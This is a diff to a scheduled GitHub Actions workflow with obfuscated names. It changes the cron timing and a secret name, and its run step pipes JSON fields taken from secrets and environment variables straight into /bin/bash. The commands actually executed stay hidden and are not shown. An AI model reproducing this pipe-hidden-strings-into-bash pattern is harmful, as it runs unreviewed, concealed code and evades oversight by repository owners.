@@ -2,22 +2,23 @@ name: dingruoyashh
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 2/6 * * *'
+    - cron: '31 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dingruoyashh
         env:
-          jazi75939: ${{ secrets.jazi75939 }}
+          zuam42183: ${{ secrets.zuam42183 }}
         run: |
-          echo $jazi75939 | jq -r .nder28 | /bin/bash
-          echo $j66 | jq -r .v992 | /bin/bash
-          echo $koj10187 | jq -r .iqmzh4 | /bin/bash
-          echo $slxl0409 | jq -r .bbtpe182 | /bin/bash
-          echo $gwhyl86 | jq -r .jn8970 | /bin/bash
-          echo $fs1 | jq -r .avbd5768 | /bin/bash
-          echo $sfzs2 | jq -r .japol2 | /bin/bash
+          echo $zuam42183 | jq -r .bybxc2 | /bin/bash
+          echo $qu6 | jq -r .ps9067 | /bin/bash
+          echo $ngi37340 | jq -r .g4400 | /bin/bash
+          echo $ztx026 | jq -r .yf2 | /bin/bash
+          echo $p1335 | jq -r .jzxma116 | /bin/bash
+          echo $ylo4 | jq -r .muj13648 | /bin/bash
+          echo $qy56541 | jq -r .xh28913 | /bin/bash
+          echo $blt3 | jq -r .rpxr1 | /bin/bash
+          echo $rhtaz3 | jq -r .njppp0 | /bin/bash
 
